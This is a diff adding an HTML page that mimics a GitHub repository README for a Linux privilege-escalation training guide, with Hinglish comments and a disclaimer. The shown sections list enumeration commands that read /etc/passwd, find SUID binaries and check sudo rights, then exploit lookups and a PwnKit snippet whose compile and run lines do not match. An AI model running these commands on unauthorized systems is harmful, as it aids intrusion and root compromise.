@@ -1,0 +1,1033 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Linux Privilege Escalation — GitHub</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg:       #0d1117;
+    --bg2:      #161b22;
+    --bg3:      #21262d;
+    --border:   #30363d;
+    --border2:  #21262d;
+    --text:     #e6edf3;
+    --muted:    #8b949e;
+    --green:    #3fb950;
+    --blue:     #58a6ff;
+    --purple:   #bc8cff;
+    --orange:   #ffa657;
+    --red:      #ff7b72;
+    --yellow:   #e3b341;
+    --tag-bg:   #1f2937;
+    --code-bg:  #161b22;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Inter', sans-serif;
+    font-size: 14px;
+    line-height: 1.6;
+  }
+
+  /* ── TOP NAV ── */
+  .gh-nav {
+    background: #161b22;
+    border-bottom: 1px solid var(--border);
+    padding: 12px 24px;
+    display: flex;
+    align-items: center;
+    gap: 24px;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+  }
+  .gh-nav .logo {
+    display: flex; align-items: center; gap: 8px;
+    font-weight: 700; font-size: 16px; color: var(--text);
+    text-decoration: none;
+  }
+  .gh-nav .logo svg { fill: var(--text); }
+  .search-bar {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 5px 12px;
+    color: var(--muted);
+    font-size: 13px;
+    width: 240px;
+    font-family: inherit;
+    display: flex; align-items: center; gap: 8px;
+  }
+  .nav-links { display: flex; gap: 20px; margin-left: auto; }
+  .nav-links a {
+    color: var(--text); text-decoration: none; font-size: 14px; font-weight: 500;
+    opacity: 0.8;
+  }
+  .nav-links a:hover { opacity: 1; }
+
+  /* ── BREADCRUMB ── */
+  .breadcrumb {
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+    padding: 10px 24px;
+    display: flex; align-items: center; gap: 6px;
+    font-size: 14px;
+  }
+  .breadcrumb a { color: var(--blue); text-decoration: none; font-weight: 600; }
+  .breadcrumb a:hover { text-decoration: underline; }
+  .breadcrumb span { color: var(--muted); }
+
+  /* ── MAIN LAYOUT ── */
+  .repo-header {
+    max-width: 1280px; margin: 0 auto;
+    padding: 24px 24px 0;
+  }
+  .repo-title-row {
+    display: flex; align-items: center; gap: 12px;
+    flex-wrap: wrap;
+    margin-bottom: 8px;
+  }
+  .repo-icon { color: var(--muted); }
+  .repo-title {
+    font-size: 20px; font-weight: 400;
+  }
+  .repo-title a { color: var(--blue); text-decoration: none; font-weight: 600; }
+  .repo-title a:hover { text-decoration: underline; }
+  .badge {
+    background: transparent;
+    border: 1px solid var(--border);
+    border-radius: 20px;
+    padding: 2px 10px;
+    font-size: 12px;
+    color: var(--muted);
+  }
+  .badge.public { border-color: #238636; color: #3fb950; }
+
+  .repo-desc {
+    color: var(--muted);
+    font-size: 14px;
+    margin-bottom: 16px;
+    max-width: 700px;
+  }
+
+  .repo-tags {
+    display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 20px;
+  }
+  .repo-tag {
+    background: rgba(56,139,253,.1);
+    color: #58a6ff;
+    border-radius: 20px;
+    padding: 2px 10px;
+    font-size: 12px;
+    cursor: pointer;
+    border: 1px solid rgba(56,139,253,.2);
+  }
+  .repo-tag:hover { background: rgba(56,139,253,.2); }
+
+  .repo-stats {
+    display: flex; gap: 20px; flex-wrap: wrap;
+    border-top: 1px solid var(--border);
+    border-bottom: 1px solid var(--border);
+    padding: 12px 0; margin-bottom: 0;
+  }
+  .stat-item {
+    display: flex; align-items: center; gap: 6px;
+    font-size: 13px; color: var(--muted);
+    cursor: pointer;
+    padding: 4px 8px; border-radius: 6px;
+  }
+  .stat-item:hover { background: var(--bg3); color: var(--text); }
+  .stat-num { color: var(--text); font-weight: 600; }
+  .stat-icon { width: 16px; height: 16px; fill: var(--muted); }
+
+  /* ── TABS ── */
+  .repo-tabs {
+    max-width: 1280px; margin: 0 auto;
+    padding: 0 24px;
+    border-bottom: 1px solid var(--border);
+    display: flex; gap: 0;
+    overflow-x: auto;
+  }
+  .tab {
+    padding: 12px 16px;
+    font-size: 14px;
+    color: var(--muted);
+    cursor: pointer;
+    border-bottom: 2px solid transparent;
+    white-space: nowrap;
+    display: flex; align-items: center; gap: 6px;
+    transition: color .15s;
+  }
+  .tab:hover { color: var(--text); }
+  .tab.active {
+    color: var(--text);
+    border-bottom-color: #f78166;
+    font-weight: 600;
+  }
+  .tab .count-badge {
+    background: var(--bg3);
+    border-radius: 20px;
+    padding: 0 6px;
+    font-size: 11px;
+    color: var(--muted);
+  }
+
+  /* ── CONTENT AREA ── */
+  .content-wrap {
+    max-width: 1280px; margin: 0 auto;
+    padding: 24px;
+    display: grid;
+    grid-template-columns: 1fr 280px;
+    gap: 24px;
+  }
+  @media(max-width: 900px) {
+    .content-wrap { grid-template-columns: 1fr; }
+    .sidebar { display: none; }
+  }
+
+  /* ── FILE TREE ── */
+  .file-bar {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    overflow: hidden;
+    margin-bottom: 16px;
+  }
+  .file-bar-header {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 10px 16px;
+    background: var(--bg3);
+    border-bottom: 1px solid var(--border);
+    font-size: 13px;
+  }
+  .commit-info { display: flex; align-items: center; gap: 8px; }
+  .avatar {
+    width: 20px; height: 20px; border-radius: 50%;
+    background: linear-gradient(135deg, #58a6ff, #3fb950);
+    display: inline-flex; align-items: center; justify-content: center;
+    font-size: 10px; font-weight: 700; color: #0d1117;
+    font-family: 'JetBrains Mono', monospace;
+  }
+  .commit-msg { color: var(--text); font-weight: 500; }
+  .commit-hash {
+    font-family: 'JetBrains Mono', monospace;
+    color: var(--blue); font-size: 12px; cursor: pointer;
+  }
+  .commit-hash:hover { text-decoration: underline; }
+  .commit-time { color: var(--muted); font-size: 12px; }
+
+  .file-row {
+    display: flex; align-items: center; gap: 10px;
+    padding: 7px 16px;
+    border-bottom: 1px solid var(--border2);
+    cursor: pointer;
+    transition: background .1s;
+  }
+  .file-row:last-child { border-bottom: none; }
+  .file-row:hover { background: var(--bg3); }
+  .file-icon { font-size: 15px; width: 18px; text-align: center; }
+  .file-name { color: var(--blue); flex: 1; font-size: 13px; }
+  .file-name:hover { text-decoration: underline; }
+  .file-commit { color: var(--muted); font-size: 12px; flex: 2; }
+  .file-date { color: var(--muted); font-size: 12px; }
+
+  /* ── README ── */
+  .readme-box {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    overflow: hidden;
+  }
+  .readme-header {
+    display: flex; align-items: center; gap: 8px;
+    padding: 12px 16px;
+    background: var(--bg3);
+    border-bottom: 1px solid var(--border);
+    font-size: 13px; color: var(--muted);
+  }
+  .readme-header svg { fill: var(--muted); }
+  .readme-body {
+    padding: 32px 40px;
+  }
+
+  /* ── MARKDOWN STYLES ── */
+  .md h1 {
+    font-size: 32px; font-weight: 700;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 16px; margin-bottom: 24px;
+    display: flex; align-items: center; gap: 12px;
+  }
+  .md h2 {
+    font-size: 22px; font-weight: 700;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 10px; margin: 32px 0 16px;
+    display: flex; align-items: center; gap: 10px;
+  }
+  .md h3 {
+    font-size: 16px; font-weight: 700;
+    margin: 24px 0 10px;
+    color: var(--text);
+  }
+  .md p { margin-bottom: 16px; color: #c9d1d9; line-height: 1.7; }
+  .md a { color: var(--blue); text-decoration: none; }
+  .md a:hover { text-decoration: underline; }
+
+  .md code {
+    font-family: 'JetBrains Mono', monospace;
+    background: rgba(110,118,129,.1);
+    border: 1px solid rgba(110,118,129,.2);
+    border-radius: 4px;
+    padding: 2px 6px;
+    font-size: 85%;
+    color: #ff7b72;
+  }
+
+  .md pre {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 20px;
+    overflow-x: auto;
+    margin: 16px 0;
+    position: relative;
+  }
+  .md pre::before {
+    content: attr(data-lang);
+    position: absolute; top: 8px; right: 12px;
+    font-size: 11px; color: var(--muted);
+    font-family: 'JetBrains Mono', monospace;
+    text-transform: uppercase; letter-spacing: 1px;
+  }
+  .md pre code {
+    background: none; border: none; padding: 0;
+    font-size: 13px; color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    line-height: 1.8;
+  }
+
+  /* syntax colors */
+  .kw { color: #ff7b72; }
+  .fn { color: #d2a8ff; }
+  .str { color: #a5d6ff; }
+  .cmt { color: #8b949e; font-style: italic; }
+  .var { color: #ffa657; }
+  .num { color: #79c0ff; }
+  .gr { color: #3fb950; }
+
+  .md ul, .md ol {
+    padding-left: 24px; margin-bottom: 16px; color: #c9d1d9;
+  }
+  .md li { margin-bottom: 6px; }
+  .md li::marker { color: var(--muted); }
+
+  /* badges row */
+  .badge-row {
+    display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 24px;
+  }
+  .md-badge {
+    height: 22px;
+    border-radius: 4px;
+    display: inline-flex; align-items: center;
+    padding: 0 8px;
+    font-size: 11px; font-weight: 700;
+    font-family: 'JetBrains Mono', monospace;
+    gap: 5px; cursor: pointer;
+  }
+  .b-green { background: #0f5132; color: #3fb950; border: 1px solid #238636; }
+  .b-blue  { background: #0d2040; color: #58a6ff; border: 1px solid #1f4a8a; }
+  .b-red   { background: #3d1212; color: #ff7b72; border: 1px solid #8a1f1f; }
+  .b-yellow{ background: #2d2000; color: #e3b341; border: 1px solid #7a5c00; }
+  .b-purple{ background: #1a0f2e; color: #bc8cff; border: 1px solid #6e3daa; }
+
+  /* alert boxes */
+  .alert {
+    border-left: 4px solid;
+    padding: 12px 16px;
+    border-radius: 0 6px 6px 0;
+    margin: 16px 0;
+    font-size: 13px;
+  }
+  .alert-note { border-color: var(--blue); background: rgba(56,139,253,.06); }
+  .alert-warn { border-color: var(--yellow); background: rgba(227,179,65,.06); }
+  .alert-danger { border-color: var(--red); background: rgba(255,123,114,.06); }
+  .alert-title { font-weight: 700; margin-bottom: 6px; font-size: 13px; display: flex; align-items: center; gap: 6px; }
+  .alert-note .alert-title { color: var(--blue); }
+  .alert-warn .alert-title { color: var(--yellow); }
+  .alert-danger .alert-title { color: var(--red); }
+
+  /* table */
+  .md table {
+    width: 100%; border-collapse: collapse;
+    font-size: 13px; margin: 16px 0;
+    border: 1px solid var(--border);
+    border-radius: 6px; overflow: hidden;
+  }
+  .md th {
+    background: var(--bg3);
+    padding: 10px 14px;
+    text-align: left; font-weight: 600;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+  }
+  .md td {
+    padding: 9px 14px;
+    border-bottom: 1px solid var(--border2);
+    color: #c9d1d9; vertical-align: top;
+  }
+  .md tr:last-child td { border-bottom: none; }
+  .md tr:hover td { background: rgba(255,255,255,.02); }
+
+  /* section divider */
+  .section-divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 32px 0;
+  }
+
+  /* ── SIDEBAR ── */
+  .sidebar { display: flex; flex-direction: column; gap: 16px; }
+  .sidebar-box {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 16px;
+  }
+  .sidebar-title {
+    font-weight: 700; font-size: 13px; margin-bottom: 12px; color: var(--text);
+  }
+  .sidebar-desc { font-size: 13px; color: var(--muted); margin-bottom: 12px; }
+  .sidebar-tags { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 12px; }
+  .sidebar-tag {
+    background: rgba(56,139,253,.1);
+    color: #58a6ff; border: 1px solid rgba(56,139,253,.2);
+    border-radius: 20px; padding: 2px 10px; font-size: 12px; cursor: pointer;
+  }
+  .sidebar-tag:hover { background: rgba(56,139,253,.2); }
+  .sidebar-stat {
+    display: flex; align-items: center; gap: 8px;
+    font-size: 13px; color: var(--muted);
+    padding: 4px 0; cursor: pointer;
+  }
+  .sidebar-stat:hover { color: var(--text); }
+  .sidebar-stat .s-num { color: var(--text); font-weight: 600; }
+  .sidebar-stat svg { fill: var(--muted); width: 16px; height: 16px; }
+
+  .contributors {
+    display: flex; gap: 6px; flex-wrap: wrap; margin-top: 4px;
+  }
+  .contrib-avatar {
+    width: 32px; height: 32px; border-radius: 50%;
+    cursor: pointer; overflow: hidden;
+    border: 2px solid transparent; transition: border-color .15s;
+    background: linear-gradient(135deg, var(--c1, #58a6ff), var(--c2, #3fb950));
+    display: flex; align-items: center; justify-content: center;
+    font-size: 12px; font-weight: 700; color: #0d1117;
+    font-family: 'JetBrains Mono', monospace;
+  }
+  .contrib-avatar:hover { border-color: var(--blue); }
+
+  /* language bar */
+  .lang-bar {
+    height: 8px; border-radius: 4px;
+    overflow: hidden; display: flex; margin-bottom: 12px;
+  }
+  .lang-seg { height: 100%; cursor: pointer; transition: opacity .15s; }
+  .lang-seg:hover { opacity: .8; }
+  .lang-list { display: flex; flex-direction: column; gap: 8px; }
+  .lang-item { display: flex; align-items: center; gap: 8px; font-size: 13px; }
+  .lang-dot { width: 12px; height: 12px; border-radius: 50%; flex-shrink: 0; }
+  .lang-name { color: var(--text); flex: 1; }
+  .lang-pct { color: var(--muted); }
+
+  /* copy button */
+  .copy-btn {
+    position: absolute; top: 10px; right: 40px;
+    background: var(--bg3); border: 1px solid var(--border);
+    border-radius: 6px; padding: 4px 10px;
+    color: var(--muted); font-size: 12px; cursor: pointer;
+    font-family: 'JetBrains Mono', monospace;
+    transition: all .15s; opacity: 0;
+  }
+  .md pre:hover .copy-btn { opacity: 1; }
+  .copy-btn:hover { color: var(--text); border-color: var(--muted); }
+
+  /* toc */
+  .toc { list-style: none; padding: 0; }
+  .toc li { border-bottom: 1px solid var(--border2); }
+  .toc a {
+    display: flex; align-items: center; gap: 8px;
+    padding: 8px 4px;
+    color: var(--muted); text-decoration: none; font-size: 13px;
+    transition: color .15s;
+  }
+  .toc a:hover { color: var(--blue); }
+  .toc a .toc-num { color: var(--border); font-family: 'JetBrains Mono', monospace; font-size: 11px; }
+
+  /* scroll */
+  ::-webkit-scrollbar { width: 8px; height: 8px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+  ::-webkit-scrollbar-thumb:hover { background: var(--muted); }
+
+  /* animations */
+  @keyframes fadeIn { from { opacity:0; transform:translateY(8px); } to { opacity:1; transform:translateY(0); } }
+  .readme-body { animation: fadeIn .3s ease; }
+
+  /* footer */
+  .gh-footer {
+    max-width: 1280px; margin: 40px auto 0;
+    padding: 24px;
+    border-top: 1px solid var(--border);
+    display: flex; gap: 24px; flex-wrap: wrap;
+    font-size: 12px; color: var(--muted);
+    align-items: center;
+  }
+  .gh-footer a { color: var(--muted); text-decoration: none; }
+  .gh-footer a:hover { color: var(--blue); text-decoration: underline; }
+</style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav class="gh-nav">
+  <a href="#" class="logo">
+    <svg width="32" height="32" viewBox="0 0 16 16">
+      <path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/>
+    </svg>
+    GitHub
+  </a>
+  <div class="search-bar">
+    <svg width="14" height="14" viewBox="0 0 16 16" fill="#8b949e"><path d="M10.68 11.74a6 6 0 01-7.922-8.982 6 6 0 018.982 7.922l3.04 3.04a.75.75 0 11-1.06 1.06l-3.04-3.04zm-5.68.26a4.5 4.5 0 100-9 4.5 4.5 0 000 9z"/></svg>
+    Search...
+  </div>
+  <div class="nav-links">
+    <a href="#">Pull requests</a>
+    <a href="#">Issues</a>
+    <a href="#">Marketplace</a>
+    <a href="#">Explore</a>
+  </div>
+  <div class="avatar" style="margin-left: 8px; width:32px; height:32px; font-size:13px;">XY</div>
+</nav>
+
+<!-- BREADCRUMB -->
+<div class="breadcrumb">
+  <a href="#">CyberPublicSchool</a>
+  <span>/</span>
+  <a href="#" style="font-weight:700;">linux-privilege-escalation</a>
+  <span style="margin-left:6px; background:#1c2030; border:1px solid #30363d; border-radius:20px; padding:1px 8px; font-size:11px; color:#8b949e;">Public</span>
+</div>
+
+<!-- REPO HEADER -->
+<div class="repo-header">
+  <div style="display:flex; align-items:center; gap:10px; margin-bottom:8px;">
+    <svg width="16" height="16" fill="#8b949e" viewBox="0 0 16 16"><path d="M2 2.5A2.5 2.5 0 014.5 0h8.75a.75.75 0 01.75.75v12.5a.75.75 0 01-.75.75h-2.5a.75.75 0 110-1.5h1.75v-2h-8a1 1 0 00-.714 1.7.75.75 0 01-1.072 1.05A2.495 2.495 0 012 11.5v-9zm10.5-1V9h-8c-.356 0-.694.074-1 .208V2.5a1 1 0 011-1h8zM5 12.25v3.25a.25.25 0 00.4.2l1.45-1.087a.25.25 0 01.3 0L8.6 15.7a.25.25 0 00.4-.2v-3.25a.25.25 0 00-.25-.25h-3.5a.25.25 0 00-.25.25z"/></svg>
+    <span style="font-size:13px; color:#8b949e;">CyberPublicSchool / <strong style="color:#58a6ff;">linux-privilege-escalation</strong></span>
+  </div>
+
+  <div class="repo-desc">
+    🔴 Official Cyber Public School Linux Privilege Escalation Master Guide — 
+Advanced Enumeration, Kernel Exploits, Binary Attacks, Container Breakout, 
+Red Team Techniques & Real-World Pentesting Methodology.
+
+🏫 Maintained by Cyber Public School  
+📚 OSCP Training | Red Team Mentorship | Practical Cyber Security Education  
+🌐 Building Real-World Ethical Hackers
+  </div>
+
+  <div class="repo-tags">
+    <span class="repo-tag">linux</span>
+    <span class="repo-tag">privilege-escalation</span>
+    <span class="repo-tag">ctf</span>
+    <span class="repo-tag">pentest</span>
+    <span class="repo-tag">security</span>
+    <span class="repo-tag">hacking</span>
+    <span class="repo-tag">suid</span>
+    <span class="repo-tag">red-team</span>
+    <span class="repo-tag">exploit</span>
+  </div>
+
+  <div class="repo-stats">
+    <div class="stat-item">
+      <svg class="stat-icon" viewBox="0 0 16 16"><path d="M8 .25a.75.75 0 01.673.418l1.882 3.815 4.21.612a.75.75 0 01.416 1.279l-3.046 2.97.719 4.192a.75.75 0 01-1.088.791L8 12.347l-3.766 1.98a.75.75 0 01-1.088-.79l.72-4.194L.818 6.374a.75.75 0 01.416-1.28l4.21-.611L7.327.668A.75.75 0 018 .25zm0 2.445L6.615 5.5a.75.75 0 01-.564.41l-3.097.45 2.24 2.184a.75.75 0 01.216.664l-.528 3.084 2.769-1.456a.75.75 0 01.698 0l2.77 1.456-.53-3.084a.75.75 0 01.216-.664l2.24-2.183-3.096-.45a.75.75 0 01-.564-.41L8 2.694z"/></svg>
+      <span class="stat-num">847</span> stars
+    </div>
+    <div class="stat-item">
+      <svg class="stat-icon" viewBox="0 0 16 16"><path d="M5 3.25a.75.75 0 11-1.5 0 .75.75 0 011.5 0zm0 2.122a2.25 2.25 0 10-1.5 0v.878A2.25 2.25 0 005.75 8.5h1.5v2.128a2.251 2.251 0 101.5 0V8.5h1.5a2.25 2.25 0 002.25-2.25v-.878a2.25 2.25 0 10-1.5 0v.878a.75.75 0 01-.75.75h-4.5A.75.75 0 015 6.25v-.878zm3.75 7.378a.75.75 0 11-1.5 0 .75.75 0 011.5 0zm3-8.75a.75.75 0 11-1.5 0 .75.75 0 011.5 0z"/></svg>
+      <span class="stat-num">312</span> forks
+    </div>
+    <div class="stat-item">
+      <svg class="stat-icon" viewBox="0 0 16 16"><path d="M8 9.5a1.5 1.5 0 100-3 1.5 1.5 0 000 3z"/><path d="M8 0a8 8 0 100 16A8 8 0 008 0zM1.5 8a6.5 6.5 0 1113 0 6.5 6.5 0 01-13 0z"/></svg>
+      <span class="stat-num">23</span> watching
+    </div>
+    <div class="stat-item" style="margin-left:auto;">
+      <button style="background:#238636;border:1px solid #2ea043;color:#fff;border-radius:6px;padding:5px 16px;font-size:13px;font-weight:600;cursor:pointer;display:flex;align-items:center;gap:6px;">
+        ⭐ Star
+      </button>
+    </div>
+    <div class="stat-item">
+      <button style="background:var(--bg3);border:1px solid var(--border);color:var(--text);border-radius:6px;padding:5px 16px;font-size:13px;font-weight:600;cursor:pointer;">
+        🍴 Fork
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- TABS -->
+<div class="repo-tabs">
+  <div class="tab active">
+    <svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M1 2.5A1.5 1.5 0 012.5 1h3A1.5 1.5 0 017 2.5v3A1.5 1.5 0 015.5 7h-3A1.5 1.5 0 011 5.5v-3zm8 0A1.5 1.5 0 0110.5 1h3A1.5 1.5 0 0115 2.5v3A1.5 1.5 0 0113.5 7h-3A1.5 1.5 0 019 5.5v-3zm-8 8A1.5 1.5 0 012.5 9h3A1.5 1.5 0 017 10.5v3A1.5 1.5 0 015.5 15h-3A1.5 1.5 0 011 13.5v-3zm8 0A1.5 1.5 0 0110.5 9h3a1.5 1.5 0 011.5 1.5v3A1.5 1.5 0 0113.5 15h-3A1.5 1.5 0 019 13.5v-3z"/></svg>
+    Code
+  </div>
+  <div class="tab">Issues <span class="count-badge">7</span></div>
+  <div class="tab">Pull requests <span class="count-badge">3</span></div>
+  <div class="tab">Actions</div>
+  <div class="tab">Security</div>
+  <div class="tab">Insights</div>
+</div>
+
+<!-- MAIN CONTENT -->
+<div class="content-wrap">
+
+  <!-- LEFT: file tree + readme -->
+  <div>
+
+    <!-- Branch + file toolbar -->
+    <div style="display:flex; align-items:center; gap:10px; margin-bottom:12px;">
+      <button style="background:var(--bg2);border:1px solid var(--border);color:var(--text);border-radius:6px;padding:5px 14px;font-size:13px;font-weight:600;cursor:pointer;display:flex;align-items:center;gap:6px;">
+        🌿 main ▾
+      </button>
+      <span style="color:var(--muted); font-size:13px;"><strong style="color:var(--text);">4</strong> branches &nbsp;·&nbsp; <strong style="color:var(--text);">12</strong> tags</span>
+      <div style="margin-left:auto; display:flex; gap:8px;">
+        <button style="background:var(--bg2);border:1px solid var(--border);color:var(--text);border-radius:6px;padding:5px 14px;font-size:13px;cursor:pointer;">
+          ⬇ Code ▾
+        </button>
+      </div>
+    </div>
+
+    <!-- File tree -->
+    <div class="file-bar">
+      <div class="file-bar-header">
+        <div class="commit-info">
+          <div class="avatar">XY</div>
+          <span class="commit-msg">Add LD_PRELOAD and Python module hijacking examples</span>
+          <span class="commit-hash">a3f8c92</span>
+        </div>
+        <span class="commit-time">2 days ago</span>
+      </div>
+      <div class="file-row">
+        <span class="file-icon">📁</span>
+        <span class="file-name">exploits/</span>
+        <span class="file-commit">Add kernel exploit scripts</span>
+        <span class="file-date">last week</span>
+      </div>
+      <div class="file-row">
+        <span class="file-icon">📁</span>
+        <span class="file-name">scripts/</span>
+        <span class="file-commit">Add enumeration automation</span>
+        <span class="file-date">3 days ago</span>
+      </div>
+      <div class="file-row">
+        <span class="file-icon">📁</span>
+        <span class="file-name">tools/</span>
+        <span class="file-commit">Add LinPEAS wrapper</span>
+        <span class="file-date">last week</span>
+      </div>
+      <div class="file-row">
+        <span class="file-icon">📄</span>
+        <span class="file-name">.gitignore</span>
+        <span class="file-commit">Initial commit</span>
+        <span class="file-date">3 weeks ago</span>
+      </div>
+      <div class="file-row">
+        <span class="file-icon">📄</span>
+        <span class="file-name">LICENSE</span>
+        <span class="file-commit">Initial commit</span>
+        <span class="file-date">3 weeks ago</span>
+      </div>
+      <div class="file-row">
+        <span class="file-icon">📝</span>
+        <span class="file-name">README.md</span>
+        <span class="file-commit">Add LD_PRELOAD and Python module hijacking examples</span>
+        <span class="file-date">2 days ago</span>
+      </div>
+      <div class="file-row">
+        <span class="file-icon">🐚</span>
+        <span class="file-name">enum_all.sh</span>
+        <span class="file-commit">Full enumeration script</span>
+        <span class="file-date">5 days ago</span>
+      </div>
+      <div class="file-row">
+        <span class="file-icon">🐍</span>
+        <span class="file-name">module_hijack.py</span>
+        <span class="file-commit">Python module hijack PoC</span>
+        <span class="file-date">2 days ago</span>
+      </div>
+    </div>
+
+    <!-- README -->
+    <div class="readme-box">
+      <div class="readme-header">
+        <svg width="16" height="16" viewBox="0 0 16 16"><path d="M0 1.75A.75.75 0 01.75 1h4.253c1.227 0 2.317.59 3 1.501A3.744 3.744 0 0111.006 1h4.245a.75.75 0 01.75.75v10.5a.75.75 0 01-.75.75h-4.507a2.25 2.25 0 00-1.591.659l-.622.621a.75.75 0 01-1.06 0l-.622-.621A2.25 2.25 0 005.258 13H.75a.75.75 0 01-.75-.75V1.75zm7.25 10.032a3.744 3.744 0 013.257-1.531h3.745V2.5h-3.495a2.25 2.25 0 00-2.25 2.25v7.082zm-1.5 0V4.75a2.25 2.25 0 00-2.25-2.25H.75v9.255h4.507c.1 0 .199.006.297.017l.196.01z"/></svg>
+        README.md
+      </div>
+      <div class="readme-body md">
+
+        <h1>
+          <span>🐧</span> Linux Privilege Escalation
+        </h1>
+
+        <div class="badge-row">
+          <span class="md-badge b-green">✓ CTF Ready</span>
+          <span class="md-badge b-red">⚡ Pentest</span>
+          <span class="md-badge b-blue">📖 Educational</span>
+          <span class="md-badge b-yellow">🔓 SUID/SGID</span>
+          <span class="md-badge b-purple">🐳 Container</span>
+        </div>
+
+        <div class="alert alert-warn">
+          <div class="alert-title">⚠️ Disclaimer</div>
+          Yeh content sirf educational aur authorized penetration testing ke liye hai. Unauthorized systems pe use karna illegal hai.
+        </div>
+
+        <p>Ek complete reference guide Linux privilege escalation ke liye — CTF players, pentesters, aur security researchers ke liye. Is repo mein manual enumeration se lekar container breakout tak sab kuch covered hai.</p>
+
+        <hr class="section-divider">
+
+        <h2>📋 Table of Contents</h2>
+        <ul class="toc">
+          <li><a href="#enum"><span class="toc-num">01</span> Enumeration</a></li>
+          <li><a href="#exploit"><span class="toc-num">02</span> Kernel &amp; Sudo Exploits</a></li>
+          <li><a href="#perms"><span class="toc-num">03</span> Weak Permissions</a></li>
+          <li><a href="#binary"><span class="toc-num">04</span> Binary Exploitation</a></li>
+          <li><a href="#env"><span class="toc-num">05</span> Environment Variable Exploits</a></li>
+          <li><a href="#container"><span class="toc-num">06</span> Docker &amp; LXD Breakout</a></li>
+          <li><a href="#nfs"><span class="toc-num">07</span> NFS no_root_squash</a></li>
+          <li><a href="#session"><span class="toc-num">08</span> Session Hijacking</a></li>
+          <li><a href="#tools"><span class="toc-num">09</span> Automated Tools</a></li>
+        </ul>
+
+        <hr class="section-divider">
+
+        <h2 id="enum">🔍 Enumeration</h2>
+
+        <h3>System Information</h3>
+        <pre data-lang="bash"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.parentElement.querySelector('code').innerText);this.textContent='Copied!'">Copy</button><code><span class="cmt"># Kernel version - exploit search ke liye zaroori</span>
+<span class="kw">uname</span> -a
+
+<span class="cmt"># Sudo version - CVE check</span>
+<span class="kw">sudo</span> -V
+
+<span class="cmt"># System users aur groups</span>
+<span class="kw">cat</span> /etc/passwd | cut -d <span class="str">":"</span> -f 1
+<span class="kw">cat</span> /etc/group  | cut -d <span class="str">":"</span> -f 1
+
+<span class="cmt"># Running processes as root</span>
+<span class="kw">ps</span> aux | <span class="kw">grep</span> root
+
+<span class="cmt"># Active network services</span>
+<span class="kw">netstat</span> -anlp</code></pre>
+
+        <h3>Privilege-Related Enumeration</h3>
+        <pre data-lang="bash"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.parentElement.querySelector('code').innerText);this.textContent='Copied!'">Copy</button><code><span class="cmt"># Sudo rights - SABSE PEHLE YEH CHECK KARO</span>
+<span class="kw">sudo</span> -l
+
+<span class="cmt"># SUID/SGID binaries</span>
+<span class="kw">find</span> / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt;/dev/null
+
+<span class="cmt"># Root crontab</span>
+<span class="kw">cat</span> /etc/crontab | <span class="kw">grep</span> <span class="str">'root'</span>
+
+<span class="cmt"># Writable directories</span>
+<span class="kw">find</span> / -writable -type d 2&gt;/dev/null
+
+<span class="cmt"># Backup files</span>
+<span class="kw">find</span> /var /etc /home /tmp -type f \( -name <span class="str">"*backup*"</span> -o -name <span class="str">"*.bak"</span> \) 2&gt;/dev/null</code></pre>
+
+        <hr class="section-divider">
+
+        <h2 id="exploit">💥 Kernel &amp; Sudo Exploits</h2>
+
+        <pre data-lang="bash"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.parentElement.querySelector('code').innerText);this.textContent='Copied!'">Copy</button><code><span class="cmt"># Kernel version ke liye exploit dhundho</span>
+./linux-exploit-suggester.sh -k <span class="num">5.1.0</span>
+<span class="kw">searchsploit</span> kernel 5.1.0
+
+<span class="cmt"># Sudo version exploit</span>
+<span class="kw">searchsploit</span> sudo 1.6
+
+<span class="cmt"># CVE-2021-4034 (PwnKit) - example</span>
+<span class="gr">gcc</span> -shared pwnkit.c -o pwnkit.so
+./pwnkit  <span class="cmt"># → root!</span></code></pre>
